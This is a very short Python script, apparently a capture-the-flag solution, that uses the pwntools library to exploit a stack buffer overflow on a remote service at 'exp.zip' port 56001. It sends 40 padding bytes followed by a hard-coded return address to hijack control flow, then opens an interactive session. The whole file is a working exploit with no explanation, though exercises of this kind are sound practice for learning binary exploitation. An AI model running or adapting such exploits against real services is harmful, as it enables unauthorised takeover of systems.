from pwn import *

p = remote("exp.zip", 56001)

payload = b"A" * 40 + p64(0x4011B6)
p.sendline(payload)


p.interactive()
